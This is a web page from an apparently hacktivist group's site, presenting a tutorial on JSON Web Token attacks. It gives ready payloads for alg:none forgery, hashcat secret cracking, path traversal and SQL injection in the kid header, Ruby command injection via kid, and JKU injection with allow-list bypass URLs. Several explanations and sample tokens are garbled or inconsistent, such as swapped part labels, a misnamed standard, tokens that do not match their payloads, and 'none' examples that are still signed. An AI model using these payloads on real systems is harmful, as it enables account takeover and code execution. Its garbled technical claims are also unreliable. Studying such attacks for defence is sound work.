

<!DOCTYPE html>
<html lang="pt">
    <style>
    .ascii {
        color: black;
        padding: 30px;
        text-align: center;
        background-image: url('../../asciiart.png');
        background-repeat: no-repeat;
        background-position: center;
        background-color: black;
    }

    .nav {
        overflow: hidden;
        background-color: rgb(5, 5, 5);
    }
    
    .nav a {
        float: left;
        display: block;
        color: white;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        font-family: monospace;
    }
    
    .nav a:hover {
        background-color: rgb(160, 13, 197);
        color: white;
    }

    .card {
    color: #000;
    background-color: #aaa;
    padding: 20px;
    margin-top: 20px;
    }
    </style>
    <title>Paper: Attacks on JSON Web Token (JWT) - Amolo Hunters</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=1024">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <body style="background-color:black;">
        <div class="nav">
            <a href="../../index.html">Home</a>
            <a href="../../papers/">Papers</a>
            <a href="../../hacktivism/">Hacktivism</a>
            <a href="../../members/">Members</a>
        </div>
        <div class="ascii">
            <h1 style="color:black;" align="right">.</h1>
            <h1 style="color:black;" align="right">.</h1>
        </div>
        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Attacks on JSON Web Token (JWT)</h1>
        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Authors: @sniss and @americosmjr</p>
        <div>
                <pre style="color:white;">
                            JWT ATTACKS      

                              Summary 
            ===========================================
                       1. Understanding JWT
                       2. Generating JWT with Python
                       3. Javascript Object Sining Encryption
                       4. Interesting Parameters
                       5. JWT Attacks
                       6. Final Considerations
            ===========================================

              _
             | |       Hacker
             | |===( )   //////
             |_|   |||  | o o|                 system
                    ||| ( c  )                  ____
                     ||| \= /                  ||   \_
                      ||||||                   ||     |
                      ||||||                ...||__/|-"
                      ||||||             __|________|__
                        |||             |______________|
                        |||             || ||      || ||
                        |||             || ||      || ||
        ----------------|||-------------||-||------||-||-------
                        |__>            || ||      || ||





        ((((((Understanding JWT ))))))

         JWT or JSON Web Tokens is a standard for sending data in JSON used for authentication or information exchange between systems, being stored on the client-side, but generated on the back-end.

         It consists of 3 parts:



         Payload (Header)
         Header (Payload)
         Signature (Signature)

         Parts are separated by '.', for example, xxxxx.yyyyy.zzzzz

         They are base64url encoded.

         Note: to decode them, we use the jwt.io website.





         **** Header ****

         It consists of the type of token (JWT) and the algorithm that will be used in the signature, for example, HS256.


         EX:


         {

         "alg": "HS256", //algorithm used in signature
         "typ": "JWT" // token type

         }




         **** Payload ****

         Where JWT data is added, this data is inserted into payload claims. Are they:


         Public claims: can be modified at will, however, to avoid problems, they have to be defined as URI or according to the IANA JWT Registry to avoid collisions.

         Private claims: These are custom claims created to share information between unregistered or public claims.

         Registered claims: are a set of non-mandatory claims, which serve to provide optional information, such as identifier (sub), date of creation (iat)


         EX:
         {
         "sub": "2232323323", //registered claim
         "name": "SNISS", //public claim
         "logged": true,
         "iat": 1653000000 //registered claim
         }


         SPOILER: (Even if it is protected against modification, we can find sensitive data inside the JWT or even break the authentication).



         **** Signature ****


         It is the payload and header encoding.

         We use the encoding algorithm set in the header.

         If implemented well, it prevents malicious users from changing the JWT.

         He looks like this. In this example, we are using the HS256 algorithm:

         HS256(
               base64UrlEncode(header) + "." +
               base64UrlEncode(util_load),
               secret_key)


        We are encoding the base64UrlEncode encoded header, concatenating with a ".", the base64UrlEncode encoded payload with the secret key set by the dev.




         ((((((Generating a JWT with Python ))))))

         To generate a JWT, we have to import the JWT lib.

         Then let's define the payload.

         Note: we won't need to set the header as we will set the encoding algorithm when we create the signature.

         We also need to set a key to use in the signature.

         And then, we use func jwt.encode to create our signature.



         Code:

         import jwt # importing the jwt library

         payload = { # setting the payload

               "name": "SNISS", #setting a public claim
                                                  
               "sub": "232342424", #setting a registered claim
            
               "admin": True
         }


         secret_key = "AmoloHT123" #secret key for signature


         jwt_signature = jwt.encode(payload, secret_key, algorithm="HS256") #creating a signature with the HS256 algorithm, we are joining the paylod + the secret_key

         print(jwt_signature)

                          
             Output:
            
                   eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhZG1pbiI6IHRydWUsICJuYW1lIjogIlNOSVNTIiwgInN1YiI6ICIyMzIzNDI0MjQiLCAidXNlciI6ICIxMjM0NTYifQ.Dsc0L-8Uew0R1M stxU7ofu1HlOj7Vg0C_9fEhOcRHQ8

                      
                      
                
                 - as we can see, the jwt was successfully created and separated into 3 parts by '.':
                    
          
                                   eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9 - Header
                                  
                                   eyJhZG1pbiI6IHRydWUsICJuYW1lIjogIlNOSVNTIiwgInN1YiI6ICIyMzIzNDI0MjQiLCAidXNlciI6ICIxMjM0NTYifQ - Payload

                                   Dsc0L-8Uew0R1MstxU7ofu1HlOj7Vg0C_9fEhOcRHQ8 - Signature
                                  

                                  

         (((((( Javascript Object Sining Encryption )))))


        JWT being a JSON structure, needs to have specifications on how to encrypt and digitally sign it

         These specifications are called Javascript Object Singing Encryption or JOSE which is composed of:


         JWS
         JWK
         JWA
         JWE

         But let's just talk about: JWS, JWE, JWK



         **** JWS ****

         When the JWT is signed, it becomes a JWS, thus ensuring the security of the JWT
         That is, the JWS is nothing more than the signed JWT, every part of the signature previously written is the anatomy and formation of the JWS.



         **** JWE ****


         JWE is an encrypted JWT, for more security purposes, it is composed of: Header, AAD, initialization vector, Cipher Text, Authentication Tag

         All encoded in base64Url


         His final result being:
                  
                   Header.EncryptedKey.InitializationVector.CipherText.AuthenticationTag
                  
                  
         **** JWK ****

         is a structure in json that will have a set of public keys with the function of verifying the signature of the JWT 


        EX: 

        {
        kty":"EC", 
        "crv":"P-256", 
        "x":"f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU", 
        "y":"x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0", 
        "kid":"7770b085bf649b726b3574764030e1bde9a10ae6" 
        } 




        ((((((Interesting parameters ))))))



         **** KID ****

         kid or Key id provides the id of the key that will be used for the servers to identify if the key is correct
         it can be used in the header of the jwt or in the JWK, the user can modify this parameter.
                


         **** JKU ****

         JKU or JWK URL, Contains a URL with a public JWK of content that will be used to verify the JWT signature


         How it works:
                      
                   1. User makes an HTTP req with the JWT
            
                   two . Application parses the JWT and extracts the JKU

                   3. Once extracted, it takes the JWK contained in the JKU

                   4. Verifies JWT signature using JWK

                   5. Send the response to the User





         ((((((JWT Attacks )))))))
                                  
                                  

         Now let's get to what matters!
                          
         JWT attacks consist of being able to modify the entire JWT or even just a parameter or claim
         In order to achieve account takeover and privilege escalation (in most cases)
         In some cases we managed to combine these vulnerabilities to achieve greater impacts such as an SQLi, SSRF, Insecurity Desserialization or even an RCE
                
                
                
                
         [[[[[[ JWT None Attack ]]]]]]
                
                
         This attack consists of modifying the 'alg' header parameter and setting it to none
                    
         Since 'alg' defines the algorithm used in the signature, when we set it to 'none' we indicate that we will not need a signature
                    
         Thus, making it possible to modify the jwt completely without having to have the secret key .
                    
                    
         This occurs when the server trusts the JWT sent by the client-side, so when it reads it will indicate that this JWT does not need a signature.
                    
                    
                    
                    
         Observation (on the jwt.io website, we can't modify the jwt without having the secret key, so we use the burp suite 'JWT Editor' extension to be able to modify it)
                    

                    
                    Ex:
                    
                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256"
                                  
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Attack --------
                        
                                eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none"  // default algorithm modifier for name
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // changing the user in order to increase the privilege
                                  "iat": 1516239022
                                }
                                
                      
                      
                      
                      [[[[[[ Brute Force na secret key ]]]]]]
                      
                      
                      
          In some algorithms used in the signature like HS256 allow to brute force the secret key, because they use autonomous and arbitrary strings.
          If the secret key is weak we can guess it using some wordlists, consequently being able to modify the signed JWT, we can use
          tools like hashcat for that.
                          
                          
                        Ex:  
                                -------- JWT --------
                                    
                                    
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJTTklTUyIsInN1YiI6IjIzMjM0MjQyNCJ9.eEH-kVtT3FfeTGWfBHt_mbVHqNtJo4STX-6Qa3OaTmE                                                           
                                    
                                  
                                Secret-Key: AmoloHT123                         
                      
                      
                      
                                {
                                    "alg": "HS256",
                                    "typ": "JWT"
                                }
                      
                      
                              {
                                    "admin": false,
                                    "name": "SNISS",
                                    "sub": "232342424"
                              }
                      
                      
                            
                            -------- Attack --------

                              With the hashcat, we will indicate the jwt and a wordlist so that we can break the secret key
                              
                              
                                ┌──(root㉿sniss)-[/home/sniss]
                                └─#  hashcat -m 16500 -a 0 jwt  wordlist.txt
                                
                              if successfully broken, we will have the output
                                  
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJTTklTUyIsInN1YiI6IjIzMjM0MjQyNCJ9.eEH-kVtT3FfeTGWfBHt_mbVHqNtJo4STX-6Qa3OaTmE:AmoloHT123
                      
                      
                                getting the AmoloHT123 password, we go to the jwt.io website and put the normal jwt and the password in the 'Verify Signature' tab
                                if successful, we can change the parameter "admin" to true
                                
                                
                                Final JWT: 
                                
                                                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.T26Dm4buOBRdxNs58srk1l_N5y1Dxii9y-YMj-9J7mM
                                
                                
                                                                                
                                {
                                    "alg": "HS256",
                                    "typ": "JWT"
                                }
                      
                      
                              {
                                    "admin": true,  //changed to true, thus achieving a privilege escalation
                                    "name": "SNISS",
                                    "sub": "232342424"
                              }
                      



                      [[[[[[ Path Traversal on KID ]]]]]]
                      
                      
           It is possible to explore path traversal through the kid parameter, in this context, path traversal allows us to bypass the jwt token, making it look for a
           secret key with null value, consequently we can sign a token using an empty secret, and thus the token is validated.

                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Attack --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZS
                                I6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyZlEuSflKxwRJSMeKKF2QT4fwpMeJf36POk6ySlZfadQssw5c
                                
                                {
                        "typ": "JWT",
                        "alg": "none",
                        "kid": "../../../../../../../../../../../../../../../../../../../dev/null"  //Payload path traversal to access file /dev/null
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // changing the user in order to increase the privilege
                                  "iat": 1516239022
                                }

                                And finally sign the token using an empty secret key

                                By doing this, the application tries to get the signature via kid, to compare this
                                signing key with the token's signing key, but the kid is null and the key
                                signature is null, due to this the handled JWT is validated.
                                By the way, we were able to modify the JWT payload and it is still being validated.





                      [[[[[[ SQL Injection in KID ]]]]]]
                      
                      
                SQL injection will allow you to predict the value returned when the application queries the database.
                You can use many exploitation methods, but Union Based allows you to easily return the value you want.

                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        --------- Attack --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Inp6enp6enp6enp6enonIHVuaW9uIHNlbGVjdCAnYWFhIn0ueyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyZlEuSflKxwRJSMeKKF2QT4fwpMeJf36POk6ySlZfadQssw5c
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none",
                                  "kid": "zzzzzzzzzzzzz' union select 'aaa"  // SQL Injection Payload, to return the value 'aaa' from the database
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // changing the user in order to increase the privilege
                                  "iat": 1516239022
                                }

                                And finally sign the token using the secret key 'aaa'

                                In this code we inject the payload in the kid parameter, selecting the text 'aaa' from the database,
                                after that the kid returns 'aaa' as the signature key, and we use this key to sign the JWT,
                                and finally it is validated, allowing to manipulate the JWT and hijack sessions.





                      [[[[[[ RCE via KID ]]]]]]
                      
                      
                      The `kid` parameter is often used to retrieve a key from:

                      - The file system
                      - A database

                      The `kid` parameter is processed before signature verification, because the signature needs the key retrieved by `kid`

                      Ruby applications usually open files in 2 ways, one is through the file.open() function and the other is kernel.open(),
                      kernel.open() will execute the file by file name if we put a pipe | and right after putting a command, we will get
                      a code execution in the application's operating system in ruby.


                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Attack --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Inx0b3VjaCAvdG1wL3Rlc3QifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none",
                                  "kid": "|touch /tmp/test"  // Payload to create a file in the tmp directory
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // changing the user in order to increase the privilege
                                  "iat": 1516239022
                                }

                                That way we can execute arbitrary commands in the application's operating system.






                      [[[[[[ JKU Header Injection ]]]]]]


                          The attack consists of modifying the JKU url so that the server obtains a malicious JWK
                          making the attacker able to modify the jwt since the JWK is responsible for verifying the signature

                          This is possible when the dev does not make a filter of allowed urls inside the jku
                        
                          however when filtering is based on 'starts with', we can bypass it in the following ways:
                                
                                          
                                          https://server.com@malicious.com
                                          
                                          https://malicious.com#server.com
                                            
                                          https://server.com:senhaaleatoria@malicious.com
                                          
                                          https://server.com/correct/open-redirect-vuln

                          
                              -------- JWT -------- 
                                  
                            eyJraWQiOiI3NzcwYjA4NWJmNjQ5YjcyNmIzNTc0NzY0MDMwZTFiZGU5YTEwYWU2IiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzbmlzcyIsImV4cCI6MTIzNDU2Nzg5MTB9.Zo5S6Z_lDu9TULpZsi7UcI8ujmfCIwrV_EQx1JayMfULAHsjIMx0k3RTToTR
                            dVckFjn42gSsn-jQHRkIw81xQtRIZFpp4_VDCk7htD-YqrKTE6vg0-tL9SXv5JBdskxMnyJ1Hioamj9NFx3mc9GIveXOx0MKwFuFtDA0Xfpo-PnSJAX_PemZGx1h8G-eY0Ehb20yA_9SH7n1P1b0gbIu790ximN5uLFNBABKCJOIVQJIiPgnQH2bMwfKoCYJ
                            gGQ3DTea3rVpTEmjOPBmt9GLePEvmsrwRePzw_-gWRYNFLqpsI1mvt8Dk5con82xtdhshmsE7M8mgv7lx08OZtwq_Q




                            {

                              "kid": "7770b085bf649b726b3574764030e1bde9a10ae6",
                              "alg": "RS256"

                              }

                              {
                                "sub": "sniss",
                                "exp": 12345678910

                              }
                          
                                  

                            -------- Attack --------  


                          Observing the JWT, we see that the signature algorithm uses RSA
                        
                          Let's generate an RSA Key to use, for that we will use the burp JWT Editor extension and click on the 'New RSA Key' option

                          After generated we will copy the key with the option 'Copy Public Key as JWK'
                        
                          Now let's put it on our malicious OBS server (put at the beginning the { "keys": [ ) 

                                        
                                            { 
                                                  "keys": [
                                                    {
                                                        "kty": "RSA",
                                                        "e": "AQAB",
                                                        "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71",
                                                        "n": "svDTmO2huaHGpZ54i2hVvFDGkbdrSTHRmMo-SOIl3JrxgX08hO0Z-6RrMYNybEbPxlxhOYpXCj6a38YqmRNSUuvIWxZrFfehu2wcw6iEyjxp6V2-OOPAdT0epBJScdes..."
                                                      
                                                    }

                                                ]
                                            }
                                          

                        With the Server ready, let's add the 'jku' parameter to the target JWT header and let's put a filter to bypass the bypass

                                          "jku": "https://vulnerable.com#nosso-server.com/jwk"

                        Let's modify the original "kid" by the value of the "kid" generated by us

                                          "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71"

                        Finally, let's sign this JWT with our RSA generated by the burp extension, for that we press sign and select our RSA



                            {

                              "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71", 
                              "alg": "RS256",
                              "jku": "https://vulnerable.com#nosso-server.com/jwk" 

                              }

                              {
                                "sub": "admin", //modified
                                "exp": 12345678910

                              }
                                

                        Thus, managing to modify the JWT completely.





        ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  Final considerations ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢

        Our paper ends here, we saw how a jwt works, how to create it and how to attack it
        Until the next paper, bye 


       ⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇         Kisses from SNISS and Americo
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                           
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            
                </pre>                    
        </div>
    </body>
</html>
